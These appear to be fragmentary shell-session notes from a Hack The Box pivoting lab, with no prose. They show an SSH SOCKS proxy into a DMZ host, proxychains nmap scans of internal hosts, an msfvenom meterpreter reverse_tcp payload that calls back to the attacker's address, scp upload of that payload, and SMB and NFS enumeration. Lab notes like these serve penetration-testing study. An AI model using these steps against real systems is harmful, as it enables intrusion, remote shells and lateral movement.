...
```shell-session
0xmid00@htb[/htb]$ ssh -D 8081 -i dmz01_key root@10.129.203.111
...
```shell-session
0xmid00@htb[/htb]$ netstat -antp | grep 8081
...
```shell-session
0xmid00@htb[/htb]$ grep socks4 /etc/proxychains.conf 
...
```shell-session
0xmid00@htb[/htb]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
...
```shell-session
0xmid00@htb[/htb]$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=443 -f elf > shell.elf
...
```shell-session
0xmid00@htb[/htb]$ scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
...
```shell-session
0xmid00@htb[/htb]$ proxychains enum4linux -U -P 172.16.8.3
...
```shell-session
0xmid00@htb[/htb]$ proxychains showmount -e 172.16.8.20
